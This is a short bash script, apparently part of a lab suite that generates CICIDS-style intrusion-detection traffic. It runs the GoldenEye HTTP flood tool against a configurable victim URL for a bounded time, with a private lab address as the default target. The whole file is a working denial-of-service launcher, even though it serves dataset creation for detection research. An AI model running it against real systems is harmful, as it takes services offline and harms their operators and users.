#!/usr/bin/env bash
# 09 DoS GoldenEye — HTTP katmanı sel (CICIDS: DoS GoldenEye). Sınırlı (timeout).
set -uo pipefail
VIC="${1:-10.10.10.30}"; DUR="${2:-20}"
echo "[dos-goldeneye] GoldenEye http://$VIC/ (${DUR}s)"
GE=""
for p in /opt/GoldenEye/goldeneye.py "$HOME/GoldenEye/goldeneye.py" /usr/share/goldeneye/goldeneye.py; do
  [ -f "$p" ] && GE="$p" && break
done
if [ -n "$GE" ]; then
  timeout "$DUR" python3 "$GE" "http://$VIC/" -w 50 -s 100 -m random 2>&1 | tail -3 || true
else
  echo "[dos-goldeneye] goldeneye.py yok → atlandı"
fi
echo "[dos-goldeneye] done"
